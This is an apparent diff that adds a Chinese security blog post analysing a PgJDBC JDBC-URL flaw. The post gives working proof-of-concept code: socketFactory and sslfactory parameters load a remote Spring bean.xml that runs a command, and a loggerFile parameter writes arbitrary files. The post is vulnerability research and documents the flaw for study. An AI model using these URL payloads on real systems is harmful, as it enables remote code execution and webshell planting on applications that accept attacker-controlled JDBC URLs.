@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            JDBC: PGSQL
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11812">https://xz.aliyun.com/t/11812</a></p>
+<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><p>影响范围：</p>
+<p>9.4.1208 &lt;&#x3D;PgJDBC &lt;42.2.25</p>
+<p>42.3.0 &lt;&#x3D;PgJDBC &lt; 42.3.2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.postgresql&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;postgresql&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;42.3.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-context-support&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;5.3.23&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="ClassPathXmlApplicationContext"><a href="#ClassPathXmlApplicationContext" class="headerlink" title="ClassPathXmlApplicationContext"></a>ClassPathXmlApplicationContext</h1><p>首先要知道这个东西可以加载远程配置文件，创建bean。</p>
+<p>运行这一条语句即可弹calc。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new ClassPathXmlApplicationContext(&quot;http://127.0.0.1:8787/bean.xml&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>bean.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;!--    普通方式创建bean--&gt;</span><br><span class="line">    &lt;bean id=&quot;exec&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;calc&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="socketFactory"><a href="#socketFactory" class="headerlink" title="socketFactory"></a>socketFactory</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws SQLException &#123;</span><br><span class="line">    String socketFactoryClass = &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;;</span><br><span class="line">    String socketFactoryArg = &quot;http://127.0.0.1:8787/bean.xml&quot;;</span><br><span class="line">    String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&quot;+socketFactoryClass+ &quot;&amp;socketFactoryArg=&quot;+socketFactoryArg;</span><br><span class="line">    Connection connection = DriverManager.getConnection(jdbcUrl);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用栈</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226220132312.png" alt="image-20240226220132312.png"></p>
+<p>openConnection之前的全部方法，大概看了下，都是初始化。</p>
+<p>在openConnectionImpl中，一定会进入getSocketFactory方法，没有其他限制。</p>
+<p>在getSocketFactory中，若不指定socketFactory，则用Default。若手动指定则会去初始化对象。</p>
+<p>那么指定socketFactory为ClassPathXmlApplicationContext，并且设置好参数，即可加载远程配置文件rce。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226220359880.png" alt="image-20240226220359880.png"></p>
+<h1 id="sslfactory"><a href="#sslfactory" class="headerlink" title="sslfactory"></a>sslfactory</h1><p>猜测sink点还是ObjectFactory#instantiate，右键，find usage 然后逐层往上找。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SocketFactoryFactory#getSslSocketFactory</span><br><span class="line">	MakeSSL#convert</span><br><span class="line">		ConnectionFactoryImpl#enableSSL</span><br><span class="line">            ConnectionFactoryImpl#tryConnect</span><br><span class="line">                ConnectionFactoryImpl#openConnectionImpl // 这就是入口</span><br></pre></td></tr></table></figure>
+
+<p>分析其中的流程后，最终到达这里：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226222736682.png" alt="image-20240226222736682.png"></p>
+<p>这里只需要让url参数里的sslfactory为上面的<code>ClassPathXmlApplicationContext</code>，让sslfactoryarg为<code>http://127.0.0.1:8787/bean.xml</code>即可。</p>
+<p>调用栈：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226222647306.png" alt="image-20240226222647306.png"></p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws SQLException &#123;</span><br><span class="line">    String sslfactory = &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;;</span><br><span class="line">    String sslfactoryarg = &quot;http://127.0.0.1:8787/bean.xml&quot;;</span><br><span class="line">    String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test/?sslfactory=&quot;+sslfactory+&quot;&amp;sslfactoryarg=&quot;+sslfactoryarg;</span><br><span class="line">    Connection connection = DriverManager.getConnection(jdbcUrl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>在<code>ConnectionFactoryImpl#tryConnect</code>中：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226223054939.png" alt="image-20240226223054939.png"></p>
+<p>他会向pg服务器建立tcp连接，只是建立而已，所以nc监听一下保证这一行不连接超时就行。</p>
+<p>在<code>ConnectionFactoryImpl#enableSSL</code>中，会向pg地址发送几个数据，并获取响应，根据响应的不同进入不同的分支。</p>
+<p>这里只要手动向nc输入一个S字符就可以了。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226223203286.png" alt="image-20240226223203286.png"></p>
+<p>然后就进入了convert，最后是getSslSocketFactory。</p>
+<h1 id="loggerFile"><a href="#loggerFile" class="headerlink" title="loggerFile"></a>loggerFile</h1><p>可以跨目录写文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws SQLException &#123;</span><br><span class="line">    String content = &quot;&lt;%java code%&gt;&quot;;</span><br><span class="line">    String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test/?loggerLevel=DEBUG&amp;loggerFile=bbbb.txt&amp;&quot;+content;</span><br><span class="line">    Connection connection = DriverManager.getConnection(jdbcUrl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226232320811.png" alt="image-20240226232320811.png"></p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ClassPathXmlApplicationContext"><span class="toc-text">ClassPathXmlApplicationContext</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#socketFactory"><span class="toc-text">socketFactory</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sslfactory"><span class="toc-text">sslfactory</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-text">注意点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#loggerFile"><span class="toc-text">loggerFile</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
